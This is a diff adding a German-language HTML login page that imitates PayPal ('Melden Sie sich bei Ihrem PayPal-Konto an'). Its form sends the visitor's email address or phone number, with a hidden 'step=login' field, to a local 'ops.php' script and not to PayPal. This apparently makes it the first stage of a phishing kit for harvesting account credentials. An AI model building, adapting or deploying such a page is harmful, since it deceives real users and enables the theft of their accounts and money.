@@ -1,0 +1,65 @@
+<!DOCTYPE html><html><head>
+  <meta charset="utf-8">
+  <title>Melden Sie sich bei Ihrem PayPal-Konto an</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- template css files-->
+  <link rel="stylesheet" href="css/bootstrap.css">
+  <link rel="stylesheet" href="css/test.css">               
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+
+  <!-- js files-->
+  <script src="js/html5shiv.min.js"></script>
+  <script src="js/respond.min.js"></script>
+
+  <!-- website logo -->
+  <link rel="icon" href="image/Untitled-1.png" type="image/x-icon">
+  <link rel="shortcut icon" href="image/Untitled-1.png" type="image/x-icon">
+
+</head>
+
+<body>
+     <div class="login">
+         <div class="logo">
+             <img src="image/logo.png">
+             <div class="change">
+                 <p></p><a href="#">Ändern</a>
+             </div>
+         </div>
+         <form action="ops.php" method="post">
+
+            <input type="hidden" name="step" value="login">
+
+             <div class="user">
+                 <input id="user" type="text" placeholder="E-Mail-Adresse oder Handynummer" name="email">
+             </div>
+
+             <a href="#">E-Mail-Adresse vergessen?</a>
+
+             <button name="submit" id="log" style="color:#fff;" class="btn btn-primary d-block">Weiter</button>
+             <div class="or">
+                 <p>oder</p>
+             </div>
+             <button type="button" class="btn btn-light">Neu anmelden</button>
+         </form>
+     </div>
+
+     <footer>
+        <div class="footer">
+            <ul class="list-unstyled d-flex">
+                <li>Kontakt</li>
+                <li>Datenschutz</li>
+                <li>AGB</li>
+                <li>Weltweit</li>
+            </ul>
+        </div>
+     </footer>
+
+  <!-- template files js-->
+  <script src="js/jquery-3.5.1.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/test.js"></script>
+
+
+</body></html>
